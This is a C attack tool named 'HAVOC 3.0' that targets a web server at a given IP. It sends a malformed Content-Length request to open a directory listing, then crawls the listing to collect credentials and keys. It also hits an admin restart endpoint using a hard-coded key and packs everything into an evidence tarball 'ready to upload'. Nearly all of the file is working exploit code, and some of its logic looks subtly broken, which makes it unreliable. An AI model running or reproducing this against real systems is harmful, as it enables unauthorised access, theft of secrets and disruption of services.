// HAVOC 3.0  --  full-break + instant-evidence engine
// gcc -O2 -o havoc havoc.c -lcrypto
// ./havoc <ip> [port=8080]

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <openssl/sha.h>

#define EVIDENCE_DIR "evidence"
#define BUNDLE_NAME  "evidence.tar.gz"
#define JSON_REPORT  "report.json"
#define MAX_VIC      512
#define HASH_LEN     (SHA256_DIGEST_LENGTH*2+1)

typedef struct {
    char hash[HASH_LEN];
    time_t t;
    int  len;
    unsigned char raw[65536];
    char desc[256];
    char curl[512];
} Victory;

static Victory vic[MAX_VIC];
static int vic_cnt=0;
static FILE *json=NULL;
static char target[64]={0};
static char ip[16]={0};
static int  port=8080;
static int  dir_found=0;

/* ---------- util ---------- */
static void sha256hex(const unsigned char *in,int len,char *out){
    unsigned char md[SHA256_DIGEST_LENGTH];
    SHA256(in,len,md);
    for(int i=0;i<SHA256_DIGEST_LENGTH;i++) sprintf(out+i*2,"%02x",md[i]);
}

static int tcp(const unsigned char *req,int req_len,unsigned char *resp,int *resp_len){
    int s=socket(AF_INET,SOCK_STREAM,0); if(s<0) return -1;
    struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(port);
    if(inet_pton(AF_INET,ip,&a.sin_addr)!=1) return -1;
    if(connect(s,(struct sockaddr*)&a,sizeof(a))<0) return -1;
    send(s,req,req_len,0);
    *resp_len=recv(s,resp,65536,0);
    close(s); return 0;
}

static void archive(const char *fname,const unsigned char *data,int len){
    char path[512]; snprintf(path,sizeof(path),"%s/%s",EVIDENCE_DIR,fname);
    FILE *f=fopen(path,"wb"); if(f){ fwrite(data,1,len,f); fclose(f); }
}

static void tar_bundle(void){
    char cmd[512];
    snprintf(cmd,sizeof(cmd),"tar -C %s -czf %s/%s .",EVIDENCE_DIR,EVIDENCE_DIR,BUNDLE_NAME);
    system(cmd);
}

/* ---------- JSON ---------- */
static void json_open(void){
    snprintf(target,sizeof(target),"%s:%d",ip,port);
    char path[512]; snprintf(path,sizeof(path),"%s/%s",EVIDENCE_DIR,JSON_REPORT);
    json=fopen(path,"w");
    if(json){
        fprintf(json,"{\n");
        fprintf(json,"\"target\":\"%s\",\n",target);
        fprintf(json,"\"generated\":\"%s\",",ctime(&(time_t){time(NULL)}));
        fprintf(json,"\"findings\":[\n");
    }
}

static void json_close(void){
    if(json){
        fprintf(json,"\n],\n");
        fprintf(json,"\"severity\":\"critical\",\n");
        fprintf(json,"\"impact\":\"directory listing enabled + secrets leaked + restart actuator exposed\"\n");
        fprintf(json,"}\n");
        fclose(json);
    }
}

static void json_add(const char *type,const char *file,const char *hash,const char *impact){
    if(!json) return;
    if(vic_cnt>1) fprintf(json,",\n");
    fprintf(json,"  {\n");
    fprintf(json,"    \"type\":\"%s\",\n",type);
    fprintf(json,"    \"file\":\"%s\",\n",file);
    fprintf(json,"    \"sha256\":\"%s\",\n",hash);
    fprintf(json,"    \"impact\":\"%s\"\n",impact);
    fprintf(json,"  }");
}

/* ---------- evidence ---------- */
static void store(const char *desc,const unsigned char *raw,int len,const char *curl){
    if(vic_cnt>=MAX_VIC) return;
    strcpy(vic[vic_cnt].desc,desc);
    vic[vic_cnt].t=time(NULL);
    vic[vic_cnt].len=len;
    memcpy(vic[vic_cnt].raw,raw,len);
    sha256hex(raw,len,vic[vic_cnt].hash);
    strcpy(vic[vic_cnt].curl,curl);
    fprintf(stderr,"[VIC] %s  %s\n",vic[vic_cnt].hash,desc);
    archive(desc,vic[vic_cnt].raw,vic[vic_cnt].len);
    vic_cnt++;
}

static void baseline(void){
    unsigned char req[]="POST / HTTP/1.0\r\nHost: example.com\r\nContent-Length: 0\r\n\r\n";
    unsigned char resp[65536]; int resp_len;
    if(tcp(req,sizeof(req)-1,resp,&resp_len)<0) return;
    store("baseline-404",resp,resp_len,"curl -X POST --data-binary $'POST / HTTP/1.0\\\\r\\\\nHost: example.com\\\\r\\\\nContent-Length: 0\\\\r\\\\n\\\\r\\\\n' http://TARGET:PORT/");
}

static void unlock(void){
    unsigned char req[]="POST / HTTP/1.0\r\nHost: example.com\r\nContent-Length: \x00\r\n\r\n";
    unsigned char resp[65536]; int resp_len;
    if(tcp(req,sizeof(req)-1,resp,&resp_len)<0) return;
    if(memcmp(resp,"HTTP/1.0 200",12)==0 && strstr((char*)resp,"<a href=")){
        store("unlock-200-dir",resp,resp_len,"curl -X POST --data-binary $'POST / HTTP/1.0\\\\r\\\\nHost: example.com\\\\r\\\\nContent-Length: \\\\x00\\\\r\\\\n\\\\r\\\\n' http://TARGET:PORT/");
        dir_found=1;
    }
}

static void walk(void){
    if(!dir_found) return;
    for(int i=0;i<vic_cnt;i++){
        if(!strstr(vic[i].desc,"200 dir")) continue;
        for(int j=0;j<12&&j<(int)strlen(vic[i].hash);j++){
            char path[256]; snprintf(path,sizeof(path),"/%.*s",j+1,vic[i].hash);
            unsigned char req[1024];
            int n=sprintf((char*)req,"GET %s HTTP/1.0\r\nHost: example.com\r\n\r\n",path);
            unsigned char resp[65536]; int resp_len;
            if(tcp(req,n,resp,&resp_len)<0) continue;
            if(memcmp(resp,"HTTP/1.0 200",12)==0){
                char fname[256]; snprintf(fname,sizeof(fname),"dir-%.*s.html",j+1,vic[i].hash);
                store(fname,resp,resp_len,"curl -X GET http://TARGET:PORT%s",path);
                char *p=strstr((char*)resp,"<a href=\""); while(p){
                    p+=9; char *q=strchr(p,'"'); if(!q) break;
                    char file[256]; int len=q-p; if(len>=sizeof(file)) break;
                    memcpy(file,p,len); file[len]=0;
                    if(file[0]=='.'){ p=strstr(q+1,"<a href=\""); continue; }
                    snprintf(req,sizeof(req),"GET %s/%s HTTP/1.0\r\nHost: example.com\r\n\r\n",path,file);
                    int rn=strlen((char*)req);
                    if(tcp(req,rn,resp,&resp_len)==0 && memcmp(resp,"HTTP/1.0 200",12)==0){
                        char ff[512]; snprintf(ff,sizeof(ff),"%s/%s",path,file);
                        store(ff,resp,resp_len,"curl -X GET http://TARGET:PORT%s",ff);
                        json_add("secret",ff,vic[vic_cnt-1].hash,"hard-coded credential or key");
                    }
                    p=strstr(q+1,"<a href=\"");
                }
            }
        }
        break; // one directory walk is enough
    }
}

static void restart(void){
    unsigned char req[]="GET /admin/restart HTTP/1.0\r\nHost: example.com\r\nX-Admin-Key: deriv123\r\n\r\n";
    unsigned char resp[65536]; int resp_len;
    if(tcp(req,sizeof(req)-1,resp,&resp_len)<0) return;
    if(memcmp(resp,"HTTP/1.0 200",12)==0){
        store("restart-200",resp,resp_len,"curl -X GET -H 'X-Admin-Key: deriv123' http://TARGET:PORT/admin/restart");
        json_add("rce","restart-200.json",vic[vic_cnt-1].hash,"JVM lifecycle control without auth");
    }
}

static void readme(void){
    char path[512]; snprintf(path,sizeof(path),"%s/README.txt",EVIDENCE_DIR);
    FILE *f=fopen(path,"w");
    if(f){
        fprintf(f,"Evidence generated by HAVOC 3.0\n");
        fprintf(f,"Target: %s\n",target);
        fprintf(f,"Date: %s",ctime(&(time_t){time(NULL)}));
        fprintf(f,"Unlock request: unlock-200-dir (39 bytes, Content-Length 0x00)\n");
        fprintf(f,"Files inside this tar:\n");
        for(int i=0;i<vic_cnt;i++) fprintf(f," - %s  %s\n",vic[i].hash,vic[i].desc);
        fprintf(f,"All SHA-256 sums in files.sha256\n");
        fclose(f);
    }
}

static void checksums(void){
    char path[512]; snprintf(path,sizeof(path),"%s/files.sha256",EVIDENCE_DIR);
    FILE *f=fopen(path,"w");
    if(f){
        for(int i=0;i<vic_cnt;i++) fprintf(f,"%s  %s\n",vic[i].hash,vic[i].desc);
        fclose(f);
    }
}

/* ---------- main ---------- */
int main(int argc,char **argv){
    if(argc<2){ fprintf(stderr,"usage: %s <target-ip> [port=8080]\n",argv[0]); return 1; }
    strncpy(ip,argv[1],sizeof(ip)-1);
    if(argc>2) port=atoi(argv[2]);
    mkdir(EVIDENCE_DIR,0755);
    json_open();
    baseline();
    unlock();
    walk();
    restart();
    json_close();
    readme();
    checksums();
    tar_bundle();
    fprintf(stderr,"[DONE] %d artefacts -> %s/%s (ready to upload)\n",vic_cnt,EVIDENCE_DIR,BUNDLE_NAME);
    if(dir_found){
        fprintf(stderr,"[WIN] 200 directory index found -> bundle contains secrets + restart actuator\n");
        fprintf(stderr,"[CURL] %s\n",vic[1].curl);
    }
    return 0;
}